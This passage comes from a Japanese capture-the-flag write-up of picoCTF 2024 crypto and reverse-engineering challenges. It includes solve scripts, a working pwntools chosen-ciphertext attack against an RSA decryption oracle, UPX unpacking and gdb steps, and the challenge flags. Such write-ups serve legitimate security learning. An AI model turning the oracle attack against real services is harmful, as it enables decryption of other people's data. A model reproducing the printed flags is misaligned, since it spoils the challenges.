class="line">    <span class="keyword">from</span> math <span class="keyword">import</span> gcd</span><br><span class="line">    <span class="keyword">from</span> functools <span class="keyword">import</span> reduce</span><br><span class="line">    key = reduce(gcd, [c // <span class="number">311</span> <span class="keyword">for</span> c <span class="keyword">in</span> cipher])</span><br><span class="line">    <span class="keyword">return</span> key</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(find_key())</span><br></pre></td></tr></table></figure>

<p>結果的に、これって <code>test()</code> 関数に書いてあった p, g, a, b から計算されるkeyであって、自力で出す必要なかった。</p>
<hr>
<p>一旦ここまでを復号する。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">cipher = [<span class="number">260307</span>, <span class="number">491691</span>, ...]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_key</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;encrypt() のアルゴリズムを見ると、cipher の0でない各要素は、 key * 311 を公約数に持っている。</span></span><br><span class="line"><span class="string">    したがって、cipher の各要素の GCD // 311 が key である。</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">from</span> math <span class="keyword">import</span> gcd</span><br><span class="line">    <span class="keyword">from</span> functools <span class="keyword">import</span> reduce</span><br><span class="line">    key = reduce(gcd, [c // <span class="number">311</span> <span class="keyword">for</span> c <span class="keyword">in</span> cipher])</span><br><span class="line">    <span class="keyword">return</span> key</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">cipher, key</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>.join([<span class="built_in">chr</span>(c // (key * <span class="number">311</span>)) <span class="keyword">for</span> c <span class="keyword">in</span> cipher])</span><br><span class="line"></span><br><span class="line">key = find_key()</span><br><span class="line">semi_cipher = decrypt(cipher, key)</span><br></pre></td></tr></table></figure>

<hr>
<p>次に <code>text_key</code> を割り出す。</p>
<p>custom_encryption.py の <code>dynamic_xor_encrypt()</code> によると、上記の <code>semi_cipher</code> を逆順に読んで正しい <code>text_key</code> と1文字ずつxorを取ると、平文が得られる。</p>
<p>平文の先頭は <code>picoCTF&#123;</code> の8文字であることが予想されるので、</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">平文 xor text_key = <span class="string">&#x27;picoCTF&#123;&#x27;</span></span><br><span class="line">平文 xor <span class="string">&#x27;picoCTF&#123;&#x27;</span> = text_key</span><br></pre></td></tr></table></figure>

<p>から、 <code>text_key</code> の先頭8文字を割り出す。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">p = dynamic_xor_encrypt(semi_cipher, <span class="string">&quot;picoCTF&#123;&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(p[:<span class="number">8</span>])</span><br></pre></td></tr></table></figure>

<p>実行すると <code>aedurtua</code> 。うまいこと循環してくれてそうで、 <code>text_key = aedurtu</code> と予想が立つ。</p>
<p>… これって custom_encryption.py に書いてあった <code>&quot;trudeau&quot;</code> の逆順だな。</p>
<hr>
<p>これまでのを組み合わせて↓を得る。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">cipher = [<span class="number">260307</span>, <span class="number">491691</span>, ...]</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> custom_encryption <span class="keyword">import</span> dynamic_xor_encrypt</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_key</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;encrypt() のアルゴリズムを見ると、cipher の0でない各要素は、 key * 311 を公約数に持っている。</span></span><br><span class="line"><span class="string">    したがって、cipher の各要素の GCD // 311 が key である。</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">from</span> math <span class="keyword">import</span> gcd</span><br><span class="line">    <span class="keyword">from</span> functools <span class="keyword">import</span> reduce</span><br><span class="line">    key = reduce(gcd, [c // <span class="number">311</span> <span class="keyword">for</span> c <span class="keyword">in</span> cipher])</span><br><span class="line">    <span class="keyword">return</span> key</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">cipher, key</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>.join([<span class="built_in">chr</span>(c // (key * <span class="number">311</span>)) <span class="keyword">for</span> c <span class="keyword">in</span> cipher])</span><br><span class="line"></span><br><span class="line">key = find_key()</span><br><span class="line">semi_cipher = decrypt(cipher, key)</span><br><span class="line"></span><br><span class="line"><span class="comment">## p = dynamic_xor_encrypt(semi_cipher, &quot;picoCTF&#123;&quot;)</span></span><br><span class="line"><span class="comment">## print(p[:8])</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(dynamic_xor_encrypt(semi_cipher, <span class="string">&quot;aedurtu&quot;</span>))</span><br></pre></td></tr></table></figure>

<p>実行するとフラグゲット。</p>
<aside style="padding: 10px; border-radius: 5px; border: 1px solid #eee; background-color: transparent; width: 800px;">
⛳ picoCTF{custom_d2cr0pt6d_751a22dc}

</aside>

<h3><span id="c3">C3</span></h3><img src="/img/2024/03-27/Untitled%2017.png" width="550px" height="auto"> 

<p>エスパー成分が結構あり、好きじゃなかった。</p>
<p>添付のconvert.pyは↓</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">chars = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">from</span> fileinput <span class="keyword">import</span> <span class="built_in">input</span></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> <span class="built_in">input</span>():</span><br><span class="line">  chars += line</span><br><span class="line"></span><br><span class="line">chars = <span class="string">&#x27;abc&#x27;</span></span><br><span class="line"></span><br><span class="line">lookup1 = <span class="string">&quot;\n \&quot;#()*+/1:=[]abcdefghijklmnopqrstuvwxyz&quot;</span></span><br><span class="line">lookup2 = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTabcdefghijklmnopqrst&quot;</span></span><br><span class="line"></span><br><span class="line">out = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">prev = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> char <span class="keyword">in</span> chars:</span><br><span class="line">  cur = lookup1.index(char)</span><br><span class="line">  out += lookup2[(cur - prev) % <span class="number">40</span>]</span><br><span class="line">  prev = cur</span><br><span class="line"></span><br><span class="line">sys.stdout.write(out)</span><br></pre></td></tr></table></figure>

<p>lookup1 のアルファベットで構成される input() を、lookup2 のアルファベットに変換してる。</p>
<p>ループの中でやっているのは、</p>
<ul>
<li><code>(cur - prev) % 40</code> で、平文の連続する2文字間の差 (diffとする) を計算し、</li>
<li>その差をインデックスとして lookup2 を表引きする (表引き結果を diff_enc とする)</li>
<li>diff_enc を1文字ずつ結合</li>
</ul>
<p>という感じ。最後に結合した文字列を出力している。</p>
<p>ということで、復号は以下のスクリプトでできる。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;ciphertext&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    ciphertext = f.read()</span><br><span class="line"></span><br><span class="line">lookup1 = <span class="string">&#x27;\n &quot;#()*+/1:=[]abcdefghijklmnopqrstuvwxyz&#x27;</span></span><br><span class="line">lookup2 = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTabcdefghijklmnopqrst&quot;</span></span><br><span class="line"></span><br><span class="line">out = <span class="string">&quot;&quot;</span></span><br><span class="line">prev = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> diff_enc <span class="keyword">in</span> ciphertext:</span><br><span class="line">    diff = lookup2.index(diff_enc)</span><br><span class="line">    cur = (prev + diff) % <span class="number">40</span></span><br><span class="line"></span><br><span class="line">    cur_char = lookup1[cur]</span><br><span class="line">    out += cur_char</span><br><span class="line"></span><br><span class="line">    prev = cur</span><br><span class="line">    </span><br><span class="line"><span class="built_in">print</span>(out)</span><br></pre></td></tr></table></figure>

<p>実行結果は以下のように、別のPythonスクリプトになる。これを <a target="_blank" rel="noopener" href="http://another.py/">another.py</a> とする。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#asciiorder</span></span><br><span class="line"><span class="comment">#fortychars</span></span><br><span class="line"><span class="comment">#selfinput</span></span><br><span class="line"><span class="comment">#pythontwo</span></span><br><span class="line"></span><br><span class="line">chars = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">from</span> fileinput <span class="keyword">import</span> <span class="built_in">input</span></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> <span class="built_in">input</span>():</span><br><span class="line">    chars += line</span><br><span class="line">b = <span class="number">1</span> / <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(chars)):</span><br><span class="line">    <span class="keyword">if</span> i == b * b * b:</span><br><span class="line">        <span class="built_in">print</span> chars[i] <span class="comment">#prints</span></span><br><span class="line">        b += <span class="number">1</span> / <span class="number">1</span></span><br></pre></td></tr></table></figure>

<p><code>input()</code> で渡された文字列から、「立方数」番目の文字を取ってきて出力している模様。</p>
<p><a target="_blank" rel="noopener" href="http://convert.py/">convert.py</a> の内容から、 <code>input()</code> 関数はこのスクリプトそのものを返すようになっているはず。<br>このスクリプトと同じディレクトリに <a target="_blank" rel="noopener" href="http://fileinput.py/">fileinput.py</a> を以下の内容で作成。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">input</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;&quot;#asciiorder</span></span><br><span class="line"><span class="string">#fortychars</span></span><br><span class="line"><span class="string">#selfinput</span></span><br><span class="line"><span class="string">#pythontwo</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">chars = &quot;&quot;</span></span><br><span class="line"><span class="string">from fileinput import input</span></span><br><span class="line"><span class="string">for line in input():</span></span><br><span class="line"><span class="string">    chars += line</span></span><br><span class="line"><span class="string">b = 1 / 1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">for i in range(len(chars)):</span></span><br><span class="line"><span class="string">    if i == b * b * b:</span></span><br><span class="line"><span class="string">        print chars[i] #prints</span></span><br><span class="line"><span class="string">        b += 1 / 1</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>

<p>python2で <a target="_blank" rel="noopener" href="http://another.py/">another.py</a> を実行する。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">% python another.py</span><br><span class="line">a</span><br><span class="line">d</span><br><span class="line">l</span><br><span class="line">i</span><br><span class="line">b</span><br><span class="line">s</span><br></pre></td></tr></table></figure>

<p>これがフラグ。</p>
<aside style="padding: 10px; border-radius: 5px; border: 1px solid #eee; background-color: transparent; width: 800px;">
⛳ picoCTF{adlibs}

</aside>

<h3><span id="rsa_oracle">rsa_oracle</span></h3><img src="/img/2024/03-27/Untitled%2018.png" width="550px" height="auto"> 

<p>難しかったけど何とか解けた。</p>
<p>暗号オラクル・復号オラクルが両方与えられているときに、与えられた暗号文を平文に戻す問題。<br>（適応的）選択平文攻撃と（適応的）選択暗号文攻撃が両方できる状況とも言える。</p>
<p>ただし、n, eが今回は未知なのでそこは面倒。</p>
<hr>
<p>既知平文の 2 を暗号化したものを C2 とする。つまり:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C2 = <span class="number">2</span>^e (mod n)</span><br></pre></td></tr></table></figure>

<p>これを、与えられた暗号文 c と掛け合わせ、復号する (※cそのものの復号は当然禁止されているので何かと掛けたり足したりする必要がある)。この操作を式変形して考えると、</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Dec(c * C2) = (c * C2)^d = c^d * C2^d = m * <span class="number">2</span> (mod n)</span><br></pre></td></tr></table></figure>

<p><code>c^d</code> は与えられた暗号文を平文化したもの ( <code>m</code> と表記した) そのものであり、また <code>C2</code> を復号すると 2 に戻ることを利用した。</p>
<p>同様にして、3 の暗号文を C3 とすると、</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Dec(c * C3) = m * <span class="number">3</span> (mod n)</span><br></pre></td></tr></table></figure>

<p><code>Dec(c * C2)</code> と <code>Dec(c * C3)</code> は共に復号オラクルから数値的に判明していることに注目。これらを利用して、</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Dec(c * C3) - Dec(c * C2) = m * <span class="number">3</span> - m * <span class="number">2</span> = m (mod n)</span><br></pre></td></tr></table></figure>

<p>と、法nでの平文mを得る。</p>
<hr>
<p>これをプログラムにして、復号パスワードを表示するようにすると↓。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line">host = <span class="string">&quot;titan.picoctf.net&quot;</span></span><br><span class="line">port = <span class="number">62026</span></span><br><span class="line"></span><br><span class="line">io = connect(host, port)</span><br><span class="line"><span class="comment">## ----------------------</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">enc_oracle</span>(<span class="params">m</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;E --&gt; encrypt D --&gt; decrypt.&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;E&quot;</span>)</span><br><span class="line">    io.sendlineafter(</span><br><span class="line">        <span class="string">b&quot;enter text to encrypt (encoded length must be less than keysize): &quot;</span>,</span><br><span class="line">        long_to_bytes(m),</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    io.recvline()</span><br><span class="line">    io.recvline()</span><br><span class="line">    io.recvline()</span><br><span class="line">    io.recvline()</span><br><span class="line">    dec_c_line = io.recvline()</span><br><span class="line"></span><br><span class="line">    c_dec = dec_c_line.split(<span class="string">b&quot;ciphertext (m ^ e mod n) &quot;</span>)[-<span class="number">1</span>].rstrip().decode()</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(c_dec)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dec_oracle</span>(<span class="params">c</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;E --&gt; encrypt D --&gt; decrypt.&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;D&quot;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;Enter text to decrypt: &quot;</span>, <span class="built_in">str</span>(c).encode())</span><br><span class="line"></span><br><span class="line">    m_line = io.recvline()</span><br><span class="line">    m_hex = (</span><br><span class="line">        m_line.split(<span class="string">b&quot;decrypted ciphertext as hex (c ^ d mod n):&quot;</span>)[-<span class="number">1</span>]</span><br><span class="line">        .rstrip()</span><br><span class="line">        .decode()</span><br><span class="line">    )</span><br><span class="line">    m = <span class="built_in">int</span>(m_hex, <span class="number">16</span>)</span><br><span class="line">    <span class="keyword">return</span> m</span><br><span class="line"></span><br><span class="line">c = <span class="number">873224563026311790736191809393138825971072101706285228102516279725246082824238887755080848591049817640245481028953722926586046994669540835757705139131212</span></span><br><span class="line"></span><br><span class="line">C2 = enc_oracle(<span class="number">2</span>)</span><br><span class="line">m2 = dec_oracle(c*C2)</span><br><span class="line"></span><br><span class="line">C3 = enc_oracle(<span class="number">3</span>)</span><br><span class="line">m3 = dec_oracle(c*C3)</span><br><span class="line"></span><br><span class="line">m = m3 - m2</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure>

<p>出力結果は <code>92d53</code> 。これを↓のパスワードとして使って、</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl enc -d -aes-<span class="number">256</span>-cbc -<span class="keyword">in</span> secret.enc -out secret.txt</span><br></pre></td></tr></table></figure>

<p>フラグゲット。</p>
<aside style="padding: 10px; border-radius: 5px; border: 1px solid #eee; background-color: transparent; width: 800px;">
⛳ picoCTF{su((3ss_(r@ck1ng_r3@_92d53250}

</aside>

<h3><span id="解けず-flag_printer">(解けず😭) flag_printer</span></h3><p>解けなかった… 試行錯誤の過程で弱々な数学力がちょっと鍛えられたのでそれは良かった。</p>
<hr>
<p>以下のプログラムが添付されている。この出力 output.bmp がフラグを表すっぽい。</p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> galois</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="variable constant_">MOD</span> = <span class="number">7514777789</span></span><br><span class="line"></span><br><span class="line">points = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> <span class="title function_">open</span>(<span class="string">&#x27;encoded.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>).<span class="title function_">read</span>().<span class="title function_">strip</span>().<span class="title function_">split</span>(<span class="string">&#x27;\n&#x27;</span>):</span><br><span class="line">    x, y = line.<span class="title function_">split</span>(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">    points.<span class="title function_">append</span>((<span class="title function_">int</span>(x), <span class="title function_">int</span>(y)))</span><br><span class="line"></span><br><span class="line"><span class="variable constant_">GF</span> = galois.<span class="title function_">GF</span>(<span class="variable constant_">MOD</span>)</span><br><span class="line"></span><br><span class="line">matrix = []</span><br><span class="line">solution = []</span><br><span class="line"><span class="keyword">for</span> point <span class="keyword">in</span> <span class="attr">points</span>:</span><br><span class="line">    x, y = point</span><br><span class="line">    solution.<span class="title function_">append</span>(<span class="title function_">GF</span>(y % <span class="variable constant_">MOD</span>))</span><br><span class="line"></span><br><span class="line">    row = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="title function_">range</span>(<span class="title function_">len</span>(points)):</span><br><span class="line">        row.<span class="title function_">append</span>(<span class="title function_">GF</span>((x ** i) % <span class="variable constant_">MOD</span>))</span><br><span class="line">    </span><br><span class="line">    matrix.<span class="title function_">append</span>(<span class="title function_">GF</span>(row))</span><br><span class="line"></span><br><span class="line"><span class="title function_">open</span>(<span class="string">&#x27;output.bmp&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>).<span class="title function_">write</span>(<span class="title function_">bytearray</span>(np.<span class="property">linalg</span>.<span class="title function_">solve</span>(<span class="title function_">GF</span>(matrix), <span class="title function_">GF</span>(solution)).<span class="title function_">tolist</span>()[:-<span class="number">1</span>]))</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>最終行で解こうとしている方程式を行列表現にする。encoded.txtのパース時点でxとなっているものをA, yとなっているものをbに対応させている点に注意。</p>
<p>$$<br>A \boldsymbol{x} &#x3D; \boldsymbol{b}<br>$$</p>
<p>ただし、</p>
<ul>
<li>encoded.txt の行数を n とする (n &#x3D; 1,769,611)</li>
<li>行列Aは n x n 行列、ベクトルx と ベクトルb は要素数nの列ベクトル</li>
<li>Aの各行は、encoded.txt の行を1列目を a とし <code>[1, a, a**2, ..., a**(n-1)]</code> としたもの</li>
<li>bの各行は、encoded.txt の2列目</li>
</ul>
<hr>
<p>また、解答のビットマップである x について以下のことが推測できる。</p>
<ul>
<li>xの各要素は、解答のビットマップの1バイトを表す<ul>
<li>encoded.txt の1行目が y &#x3D; 66 (chr(66) &#x3D; ‘B’) であることから、bitmapファイル先頭のマジックコード <code>BM</code> のBっぽいので</li>
</ul>
</li>
<li>ビットマップは1.7MBくらい<ul>
<li>n &#x3D; 1,769,611 なので</li>
</ul>
</li>
</ul>
<hr>
<p>解き方の制約を考えてみる。</p>
<ul>
<li>愚直に逆行列を求めるのは O(n^3) &#x3D; O(10^18) くらいで絶対無理</li>
<li>行列Aをメモリに保つ必要のある手法（ガウスの掃き出し法など）は、 n^2 &#x3D; 10^12 バイトくらいのオーダーのメモリが必要で不可能っぽい</li>
<li>時間計算量的には、せいぜい O(n log n) くらいのものじゃないとだめ</li>
</ul>
<p>となると、反復法に代表される近似アルゴリズムか？とも思うのだが、有限体で反復法みたいに誤差を小さくする考えが通用するとはどうも思えない。</p>
<p>ここらへんで離脱…</p>
<h2><span id="reverse-engineering">Reverse Engineering</span></h2><h3><span id="packer">packer</span></h3><img src="/img/2024/03-27/Untitled%2019.png" width="550px" height="auto"> 

<p>そのままGhidraで逆コンパイルしてもmain関数すら見つからずわけがわからない。</p>
<p><code>strings out</code> すると↓が見つかり、UPXでパックされていることがわかる。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$Info: This file is packed with the UPX executable packer http://upx.sf.net $</span><br><span class="line">$Id: UPX 3.95 Copyright (C) 1996-2018 the UPX Team. All Rights Reserved. $</span><br></pre></td></tr></table></figure>

<p>アンパックする:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">upx -d out</span><br></pre></td></tr></table></figure>

<p>再びGhidraで見ると、main関数にフラグのhex encodeが書いてある。</p>
<img src="/img/2024/03-27/Untitled%2020.png" width="550px" height="auto"> 

<aside style="padding: 10px; border-radius: 5px; border: 1px solid #eee; background-color: transparent; width: 800px;">
⛳ picoCTF{U9X_UnP4ck1N6_B1n4Ri3S_5dee4441}

</aside>

<h3><span id="factcheck">FactCheck</span></h3><img src="/img/2024/03-27/Untitled%2021.png" width="550px" height="auto"> 

<p>Ghidraで逆コンパイルすると、main関数内でC++のstringでflagを作っている様子。</p>
<p>main関数で普通にflag作り終えてそう。gdbで <code>b main</code> してステップ実行を続けるとスタック上の変数のフラグが育っていくのが最後まで確認できる。</p>
<img src="/img/2024/03-27/Untitled%2022.png" width="550px" height="auto"> 

<aside style="padding: 10px; border-radius: 5px; border: 1px solid #eee; background-color: transparent; width: 800px;">
⛳ picoCTF{wELF_d0N3_mate_e9da2c0e}

</aside>

<h3><span id="classic-crackme-0x100">Classic Crackme 0x100</span></h3><img src="/img/2024/03-27/Untitled%2023.png" width="550px" height="auto"> 

<p>Ghidraで逆コンパイル。main関数の中で、ユーザー入力のパスワードを何かしら変換し、それをスタック領域の答えと memcmp で比較している様子。</p>
<p>パスワードを適当に <code>aaaa</code> とし、memcmp関数でbreakしたときのGDBの様子抜粋:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">──────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / <span class="built_in">set</span> <span class="built_in">emulate</span> on ]───────────────────────────────────────────────────────────────────────────</span><br><span class="line"> ► 0x40136a &lt;main+500&gt;    call   memcmp@plt                      &lt;memcmp@plt&gt;</span><br><span class="line">        s1: 0x7fffffffd9f0 ◂— <span class="string">&#x27;addgQTTWQTTWTWWZQTTWTWWZTWWZWZZ]QTTWTWWZTWWZWZZ]TW&#x27;</span></span><br><span class="line">        s2: 0x7fffffffda30 ◂— <span class="string">&#x27;lxpyrvmgduiprervmoqkvfqrblqpvqueeuzmpqgycirxthsjaw&#x27;</span></span><br><span class="line">        n: 0x32</span><br></pre></td></tr></table></figure>

<p>s2のほうが答え。s1は、先頭4文字だけいい感じに英語小文字になっていて、それ以外は大文字とか記号になっている。</p>
<p>逆コンパイル結果から、ユーザー入力のパスワードを変換している箇所を抜粋（変数名はいい感じに修正した）。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">_51 = (<span class="type">int</span>)sVar2;</span><br><span class="line">_0x55 = <span class="number">0x55</span>;</span><br><span class="line">_0x33 = <span class="number">0x33</span>;</span><br><span class="line">_0xf = <span class="number">0xf</span>;</span><br><span class="line">a_ch = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line"><span class="keyword">for</span> (; i &lt; <span class="number">3</span>; i = i + <span class="number">1</span>) &#123;</span><br><span class="line">  <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; _51; j = j + <span class="number">1</span>) &#123;</span><br><span class="line">    local_28 = (j % <span class="number">0xff</span> &gt;&gt; <span class="number">1</span> &amp; _0x55) + (j % <span class="number">0xff</span> &amp; _0x55);</span><br><span class="line">    local_2c = ((<span class="type">int</span>)local_28 &gt;&gt; <span class="number">2</span> &amp; _0x33) + (_0x33 &amp; local_28);</span><br><span class="line">    iVar1 = ((<span class="type">int</span>)local_2c 